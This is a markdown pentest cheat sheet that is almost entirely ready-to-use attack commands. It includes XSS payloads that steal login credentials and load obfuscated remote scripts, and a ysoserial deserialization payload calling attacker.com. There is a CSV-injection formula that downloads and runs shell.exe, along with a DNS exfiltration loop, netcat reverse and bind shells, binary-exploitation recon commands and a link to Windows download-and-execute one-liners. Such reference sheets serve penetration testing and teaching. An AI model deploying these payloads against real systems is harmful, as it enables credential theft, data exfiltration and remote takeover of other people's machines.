# Pentest Commands

## Web Exploitation

 1. XSS Payloads for script context to exfiltrate data

  1. Steal password with Ajax jquery
    ```javascript
    $.get("https://localhost/"+document.getElementsByName('username')[2].value+document.getElementsByName('password')[3].value,0);
    ```
  2. Include external JS script in script context with Ajax Jquery
   > Mainly useful when payload size is very restrictive
   ```javascript
   $.getScript(String.fromCharCode(104,116,116,112,58,47,47,120,115,115,47,116,46,106,115),1)
   ```

 2. Blind Java Deserialization Payloads
 ```bash
 java -jar ysoserial.jar CommonsCollections1 'sh -c $@|sh . echo ping $(whoami).<attacker.com>' | base64 | tr -d "\n"
 ```
 
 3. CSV Injection Out of band Exploitation Payloads
 ```bash
 =cmd|' /C powershell Invoke-WebRequest "https://attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
 ```

## Network
 ### DNS Exfiltration

 1. On Victim machine Linux
 ```bash
  for i in `ls`; do host $i.domain.com domain.com;done
  ```
 2. On Attacker's machine
  ```bash
  tcpdump -vvv -s 0 -l -n dst host domain.com and dst port 53 -w dump
  ```
 3. To view data only for saved packet dump
  ```bash
  tcpdump -r dump|cut -d"?" -f2|awk 'split($0,a,".domain"){print a[1]}'|sort -u
  ```

 ### Reverse and Bind shells  

  1. Reverse shell With Traditional Netcat [Without -e flag]
  ```bash
  /usr/bin/mknod /tmp/bp p;/bin/nc <attacker_ip> 1337 0</tmp/bp | /bin/sh 1>/tmp/bp
  ```
 ```bash
  /usr/bin/mkfifo /tmp/mf;/bin/nc <attacker_ip> 1337 < /tmp/mf | /bin/sh &>/tmp/mf
 ```
  2. Bind shell with Traditional Netcat [Without -e flag]
  ```bash
  /usr/bin/mkfifo /tmp/bmf;nc -lk 1337 0< /tmp/bmf | /bin/sh &>/tmp/bmf
  ```
 ### Python Debugging Server
  1. HTTPS Server
  ```python
  # this is taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
  # generate server.xml with the following command:
  #    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
  # run as follows:
  #    python simple-https-server.py
  # then in your browser, visit:
  #    https://localhost:4443

  import BaseHTTPServer, SimpleHTTPServer
  import ssl

  httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  httpd.serve_forever()
  ```
  2. SMTP Server
   ```bash
   python -m smtpd -n -c DebuggingServer localhost:25
   ```


## Software Exploitation
 ### Binary Exploitation (linux)

   1. Find the offset of /bin/sh in libc
   ```Bash
   strings -a -t x /lib/libc-2.11.2.so |grep "/bin/sh"
   ```
   2. Find ROP gadgets
   ```Bash
   objdump -d -M intel ./<binary.elf>|grep -B5 "ret"
   ```
   3. Find if stack is execuatble and writable memory locations
   ```Bash
   readelf -lS ./<binary.elf>
   ```
   4. Find memory address of Global offset table
   ```Bash
   objdump -R ./binary.elf
   ```
   5. Get Entry point of ELF file
   ```Bash
   readelf -h ./binary.elf
   ```
   6. Get file headers, section headers and program headers
   ```Bash
   readelf -e ./binary.elf
   ```

## MISC
 ### Important Links

  **<u>Windows One liners to download and execute payload</u>**

  * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
